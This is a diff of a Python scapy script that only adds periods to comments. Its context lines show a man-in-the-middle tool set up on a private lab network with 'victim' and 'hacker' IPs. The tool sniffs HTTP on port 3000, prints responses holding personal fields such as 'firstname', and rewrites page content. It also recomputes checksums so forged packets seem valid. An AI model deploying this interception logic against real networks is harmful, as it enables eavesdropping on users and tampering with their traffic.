@@ -5,15 +5,15 @@ from scapy.layers.http import HTTPRequest, HTTPResponse
 import html
 import click
 
-# Define the victim's IP address
+# Define the victim's IP address.
 victim_ip = "192.168.3.100"
 hacker_ip = "192.168.3.101"
 router_ip = "192.168.3.104"
 
-# Dictionary to store TCP streams
+# Dictionary to store TCP streams.
 http_responses = {}
 
-# Define network information
+# Define network information.
 router_mac = getmacbyip(router_ip)  # "10:be:f5:d5:57:90"
 
 def packet_handler(packet):
@@ -29,7 +29,7 @@ def packet_handler(packet):
             print("PACKET CAPTURED FROM WEBSERVER")
             packet = packet_sendtrough(packet)
 
-    # Send the modified packet back to the victim
+    # Send the modified packet back to the victim.
     send(packet, verbose=False)
     if shwmsg:
         print(f"Forwarded packet from {packet[IP].src} to {packet[IP].dst}")
@@ -37,7 +37,7 @@ def packet_handler(packet):
     return
 
 def format_html(html_content):
-    # Use html.unescape to handle HTML entities for better readability
+    # Use html.unescape to handle HTML entities for better readability.
     return html.unescape(html_content)
 
 def modify_packet(packet):
@@ -46,7 +46,7 @@ def modify_packet(packet):
         tcp = packet[TCP]
         stream_index = (tcp.sport, tcp.dport, tcp.seq, tcp.ack)
 
-        # Reassemble TCP stream
+        # Reassemble TCP stream.
         if stream_index not in http_responses:
             http_responses[stream_index] = b""
 
@@ -55,12 +55,12 @@ def modify_packet(packet):
             http_responses[stream_index] += payload
 
             try:
-                # Attempt to decode and find the HTTP response in the reassembled stream
+                # Attempt to decode and find the HTTP response in the reassembled stream.
                 payload_decoded = http_responses[stream_index].decode(errors='ignore')
                 headers_end_idx = payload_decoded.find('\r\n\r\n')
                 if headers_end_idx != -1:
                     entity_body = payload_decoded[headers_end_idx + 4:]
-                    # Format and print HTML content
+                    # Format and print HTML content.
                     formatted_entity_body = format_html(entity_body)
                     if "firstname" in formatted_entity_body:
                         print(payload_decoded)
@@ -86,7 +86,7 @@ def modify_packet(packet):
                             else:
                                 headers_content_length_idx += 1
 
-                        # Modify packet payload with new HTML content
+                        # Modify packet payload with new HTML content.
                         print(payload_decoded[:headers_end_idx + 4])
                         new_payload = f"{payload_decoded[:headers_end_idx + 4].encode()} + \n + {new_entity_body.encode()}"
                         print("Dit is de info van de victim:" + packet[Raw].load)
@@ -96,16 +96,16 @@ def modify_packet(packet):
                     else:
                         packet[Raw].load = payload_decoded
 
-                    # Clear the stored response after printing
+                    # Clear the stored response after printing.
                     del http_responses[stream_index]
 
                     http_responses[stream_index] = b""
 
-                    # Recalculate checksums
+                    # Recalculate checksums.
                     del packet[IP].chksum
                     del packet[TCP].chksum
 
-                    # Recreating the checksums to make the packet seem valid
+                    # Recreating the checksums to make the packet seem valid.
                     packet[IP].chksum = None
                     packet[TCP].chksum = None
 
@@ -123,7 +123,7 @@ def modify_packet(packet):
 
 def packet_callback(packet):
 
-    # Modify the packet's destination to the webserver IP
+    # Modify the packet's destination to the webserver IP.
     packet[IP].dst = router_ip
     if packet.haslayer(TCP):
         packet = modify_packet(packet)
@@ -132,12 +132,12 @@ def packet_callback(packet):
 
 def packet_sendtrough(packet):
 
-    # Modify the packet's destination to the victim IP
+    # Modify the packet's destination to the victim IP.
     packet[IP].dst = victim_ip
 
     return packet
 
-# Sniff packets on the network and use packet_callback to process them
+# Sniff packets on the network and use packet_callback to process them.
 if __name__ == "__main__":
     while True:
         sniff(prn=packet_handler, filter='tcp port 3000', store=0)
